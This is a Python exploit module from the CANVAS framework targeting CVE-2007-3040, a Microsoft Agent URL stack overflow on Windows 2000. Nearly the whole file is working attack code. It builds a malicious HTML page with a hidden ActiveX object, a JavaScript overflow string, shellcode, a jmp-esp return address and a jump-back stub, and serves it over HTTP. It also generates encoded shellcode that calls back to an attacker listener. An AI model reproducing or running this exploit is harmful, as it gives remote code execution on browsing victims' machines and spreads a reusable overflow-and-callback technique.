#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Microsoft Agent URL Overflow'
DESCRIPTION='Microsoft Agent URL InternetCanonicalizeUrlW Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='09/11/07'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/ms07-051.mspx'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-3040'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3040'
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS07-051'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Tested on:
Windows 2000 Advanced Server SP0 English OOTB
Windows 2000 Advanced Server SP2 English OOTB
Windows 2000 Professional SP4 French UP2DATE

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ms07_051 -l 10.10.13.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['Windows 2000',0x01039f17] #jmp esp
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME 
        self.filename='test.html'
        return

    def makefile(self):
        self.info,self.eip=targets[self.clientversion]
        jmpback=mosdef.assemble('jmp $-%d'%(0x1000+5),'x86')
        if (len(jmpback)%2)!=0:
            jmpback+='A'
        filedata="""
<html>
<body>
<object style="visibility:hidden" id="MSAgent" classid="CLSID:D45FD31B-5C6E-11D1-9EC1-00C04FD7081F"></object> 
<script language="JavaScript">
  MSAgent.Connected = true;
  NewAgent = "http://AA/";
  Data = ""
  Data += unescape("SHELLCODE");
  while ((Data.length % 3) != 0) Data += unescape("%u9090");
  NewAgent += Data;
  for (i = 0; i < (680 - (Data.length / 3)); i++) NewAgent += " ";
  NewAgent += unescape("EIP");
  NewAgent += "CCCCCC";
  NewAgent += unescape("JMPBACK")
  NewAgent += ".acf";
  MSAgent.Characters.Load("DD", NewAgent);
  Agent = MSAgent.Characters.Character(AgentID);
</script>
</body>
</html>
        """.replace('SHELLCODE',urluencode(self.shellcode))
        filedata=filedata.replace('EIP',urluencode(struct.pack('<L',self.eip)))
        filedata=filedata.replace('JMPBACK',urluencode(jmpback))
        #print filedata
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
